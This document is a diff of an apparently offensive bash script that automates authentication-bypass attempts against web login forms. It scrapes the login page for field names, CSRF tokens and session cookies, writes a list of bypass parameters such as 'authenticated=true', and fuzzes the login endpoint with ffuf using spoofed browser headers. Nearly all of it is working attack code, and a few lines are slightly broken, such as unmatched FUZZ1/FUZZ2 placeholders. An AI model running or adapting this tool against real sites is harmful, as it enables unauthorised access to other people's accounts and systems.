@@ -242,44 +242,51 @@ grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|j
 sed 's:[/?]*$::' | sed 's:$:/:' | head -n 1)
 
 if [ -z "$LOGIN" ]; then
-    color_print RED "[!] No login page found. Exiting."
+    echo "[!] No login page found. Exiting."
     exit 1
 fi
 
+# Fetch HTML
 HTML=$(curl -s "$LOGIN")
 FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)
 
-# CAPTCHA check
-if echo "$HTML" | grep -qiE "g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"; then
-    color_print RED "[!] CAPTCHA detected."
+# CAPTCHA / reCAPTCHA Check
+CAPTCHA_KEYWORDS="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
+if echo "$HTML" | grep -qiE "$CAPTCHA_KEYWORDS"; then
+    echo "[!] CAPTCHA detected on login page."
     exit 1
 fi
 
-# Extract Form Action & Method
+# Extract Form Action and Method
 ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
 [ -z "$ACTION" ] && ACTION="$LOGIN"
 
 METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
 [ -z "$METHOD" ] && METHOD="post"
 
-BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
 if [[ "$ACTION" == /* ]]; then
+    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
     FULL_ACTION="${BASE_URL}${ACTION}"
 elif [[ "$ACTION" =~ ^https?:// ]]; then
     FULL_ACTION="$ACTION"
 else
-    FULL_ACTION=$(dirname "$LOGIN")"/$ACTION"
+    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
+    FULL_ACTION="${BASE_URL}${ACTION}"
 fi
 
-# Extract Username & Password Fields
-USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
-PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
+# Extract Username & Password Ffiles
+USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
+grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
+PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
+grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
+
 [ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
 [ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"
 
-# CSRF Token Extraction
+# CSRF Token Extration
 CSRF_FIELD=""
 CSRF_VALUE=""
+
 HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
 while read -r INPUT; do
     NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
@@ -291,13 +298,29 @@ while read -r INPUT; do
     fi
 done <<< "$HIDDEN_INPUTS"
 
-# Prepare POST Data
-DATA="${USERNAME_FIELD}=admin&${PASSWORD_FIELD}=admin12341234"
+if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
+    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
+    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
+fi
+
+# Prepre POST Data
+DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
 [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
 
-COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I' | cut -d';' -f1 | grep -i 'PHPSESSID')
+# Extract Cookies
+COOKIES=$(curl -s -I "$URL" \
+  | grep -i '^Set-Cookie:' \
+  | sed -E 's/^Set-Cookie: //I' \
+  | cut -d';' -f1 \
+  | grep -i 'PHPSESSID')
+
+# Extract only domain and port
+HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')
+
+# Headers
 HEADERS=(
   -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
   -H "Accept-Language: en-US,fa-IR;q=0.5"
   -H "Accept-Encoding: gzip, deflate"
   -H "Content-Type: application/x-www-form-urlencoded"
@@ -311,7 +334,8 @@ HEADERS=(
 )
 
 # Auth Bypass Header
-cat > /tmp/auth-bypass-params.txt << EOF
+payload_list="payloads.txt"
+cat > $payload_list << EOF
 authenticated=yes
 authenticated=true
 authenticated=1
@@ -343,18 +367,18 @@ auth_role_name=yes
 auth_role_name=true
 auth_role_name=1
 EOF
-
+​
 # Run FFUF
 if [[ "$METHOD" == "get" ]]; then
     FFUF_URL="${FULL_ACTION}?${DATA}"
     ffuf -u "$FFUF_URL?FUZZ" \
-         -w "/tmp/auth-bypass-params.txt:FUZZ" \
+         -w "$payload_list:FUZZ" \
          -X GET \
          -ac -c -r -mc 200 \
          "${HEADERS[@]}"
 else
     ffuf -u "$FULL_ACTION?FUZZ" \
-         -w "/tmp/auth-bypass-params.txt:FUZZ" \
+         -w "$payload_list:FUZZ" \
          -X POST -d "$DATA" \
          -ac -c -r -mc 200 \
          "${HEADERS[@]}"
